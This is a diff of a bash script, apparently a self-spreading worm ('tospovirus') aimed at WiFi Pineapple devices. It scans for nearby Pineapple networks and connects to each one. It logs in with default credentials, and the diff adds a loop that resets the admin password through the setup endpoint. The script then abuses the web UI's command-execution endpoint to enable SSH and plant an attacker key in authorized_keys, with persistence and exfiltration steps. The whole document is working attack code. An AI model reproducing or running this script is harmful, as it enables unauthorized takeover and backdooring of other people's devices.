@@ -1,5 +1,5 @@
 #!/bin/bash
-a1=`uci get wireless.@wifi-iface[0].ssid`
+a2=`uci get wireless.@wifi-iface[0].ssid`
 init() {
 if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
 then
@@ -30,17 +30,17 @@ uci import -f /tospo/n && uci commit
 wifi
 }
 connect() {
-a2=$1
+a3=$1
 ifconfig wlan1 up
 ifconfig br-lan 172.16.42.191 down
 ifconfig wlan0 down
-a4=$(uci show wireless | grep "wireless.@wifi-iface\[[0-9]\].device=radio1" | cut -d'[' -f 2 | cut -d']' -f 1)
-uci delete wireless.@wifi-iface[$a4].key
-uci delete wireless.@wifi-iface[$a4].encryption
-uci set wireless.@wifi-iface[$a4].network=wan
-uci set wireless.@wifi-iface[$a4].mode=sta
-uci set wireless.@wifi-iface[$a4].ssid="$a2"
-uci set wireless.@wifi-iface[$a4].hidden=0
+a5=$(uci show wireless | grep "wireless.@wifi-iface\[[0-9]\].device=radio1" | cut -d'[' -f 2 | cut -d']' -f 1)
+uci delete wireless.@wifi-iface[$a5].key
+uci delete wireless.@wifi-iface[$a5].encryption
+uci set wireless.@wifi-iface[$a5].network=wan
+uci set wireless.@wifi-iface[$a5].mode=sta
+uci set wireless.@wifi-iface[$a5].ssid="$a3"
+uci set wireless.@wifi-iface[$a5].hidden=0
 uci set wireless.radio1.channel=11
 uci commit wireless
 wifi
@@ -48,12 +48,21 @@ sleep 3
 ifconfig wlan1 172.16.42.146
 }
 post() {
-a3=`printf "$2" | wc -c`
-printf "POST $1 HTTP/1.1\r\nHost: 172.16.42.1:1471\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$3\r\nContent-Length: $a3\r\nConnection: close\r\n\r\n$2" | nc 172.16.42.1 1471
+a4=`printf "$2" | wc -c`
+printf "POST $1 HTTP/1.1\r\nHost: 172.16.42.1:1471\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$3\r\nContent-Length: $a4\r\nConnection: close\r\n\r\n$2" | nc 172.16.42.1 1471
+}
+bf() {
+a0=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -o '[0-9a-z]{32}'`
+for a7 in `seq 1 $1`
+do
+post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$a0" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$a0" | grep "success" && return 0
+done
+return 1
 }
 login() {
-a0="username=root&password=pineapplesareyummy&login="
-post '/includes/api/login.php' "$a0" "tospovirus" | grep -i 'invalid username' && echo "Login Failed..." && popstate && exit
+a1="username=root&password=pineapplesareyummy&login="
+post '/includes/api/login.php' "$a1" "tospovirus" | grep -i 'invalid username' && echo "Login Failed..." && return 1
+return 0
 }
 infect() {
 post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "tospovirus"
@@ -67,11 +76,11 @@ which openssl && iwlist wlan0 scan essid "$(cat /etc/config/wireless | grep "key
 }
 init
 exfiltrate
-for a5 in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$a1"`
+for a6 in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$a2"`
 do
 pushstate
-connect `echo $a5 | cut -d '"' -f 2`
-login 
+connect `echo $a6 | cut -d '"' -f 2`
+login || (bf 75 && login || popstate && break)
 infect
 persist
 popstate
